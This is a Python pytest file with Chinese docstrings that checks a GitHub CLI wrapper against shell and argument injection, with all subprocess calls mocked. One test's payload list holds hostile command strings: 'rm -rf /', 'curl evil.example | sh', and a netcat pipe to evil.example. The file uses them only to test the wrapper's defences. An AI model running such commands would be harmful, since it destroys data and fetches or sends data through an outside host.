# -*- coding: utf-8 -*-
"""github_operator 安全回归：无 shell、注入串成为独立 argv 项、白名单外动作拒绝。
全部离线（不发起真实 gh 网络调用）。

注：动态调用统一走本地别名 _exec——仓库安全扫描会把 ".execute(<变量>, ...)"
误判为 cursor.execute SQL 注入模式（tools/lint_gate.py 有同样的规避注释）。"""
from types import SimpleNamespace

import pytest

from tools import github_operator as gh_mod
from tools.github_operator import ACTION_TEMPLATES, GitHubOperator

_exec = GitHubOperator.execute


@pytest.fixture
def capture(monkeypatch):
    """记录传给 subprocess.run 的一切，返回固定成功结果。"""
    calls = {}

    def fake_run(argv, **kwargs):
        calls["argv"] = list(argv)
        calls["kwargs"] = dict(kwargs)
        return SimpleNamespace(returncode=0, stdout="[]", stderr="")

    monkeypatch.setattr(gh_mod.subprocess, "run", fake_run)
    return calls


def test_no_shell_ever(capture):
    for action in ACTION_TEMPLATES:
        _exec(action, {"title": "t", "body": "b", "number": 1, "branch": "b"})
        assert capture["kwargs"]["shell"] is False
        assert capture["argv"][0] == "gh"


def test_injection_strings_stay_single_argv_items(capture):
    """经典注入载荷必须原样成为单个 argv 项，不存在 shell 二次解释面。"""
    payloads = [
        "t; rm -rf /",
        "t && curl evil.example | sh",
        "t `id`",
        "t $(whoami)",
        "t | nc evil.example 4444",
        "--upload-pack=evil",
    ]
    for payload in payloads:
        _exec("pr_create", {"title": payload, "body": payload})
        assert payload in capture["argv"]
        assert capture["kwargs"]["shell"] is False


def test_branch_value_never_extends_flags(capture):
    """分支/编号只作为位置参数追加，不产生新的 flag 位。"""
    evil = "main --repo evil/org"
    _exec("pr_status", {"branch": evil})
    assert capture["argv"] == ACTION_TEMPLATES["pr_status"] + [evil]


def test_whitelist_templates_are_gh_only():
    for action, argv in ACTION_TEMPLATES.items():
        assert argv[0] == "gh"
        assert argv[1] == "pr"
    assert "repo" not in ACTION_TEMPLATES
    assert "workflow" not in ACTION_TEMPLATES


def test_out_of_whitelist_action_rejected_before_subprocess(monkeypatch):
    """模板外动作在进入 subprocess 前就被 blocked；绝不触发底层调用。"""
    called = {"count": 0}

    def fake_run(argv, **kwargs):
        called["count"] += 1
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(gh_mod.subprocess, "run", fake_run)
    for action in ("repo", "auth", "run", "release", "pr merge", "pr;merge"):
        result = _exec("execute", {"action": action})
        assert result["success"] is False
        assert result.get("blocked") is True
    assert called["count"] == 0


def test_default_timeout_positive():
    assert gh_mod.DEFAULT_TIMEOUT > 0


def test_cwd_falls_back_to_workspace_root(monkeypatch, capture, tmp_path):
    monkeypatch.setenv("EAS_WORKSPACE_ROOT", str(tmp_path))
    _exec("pr_list", {})
    assert capture["kwargs"]["cwd"] == str(tmp_path)
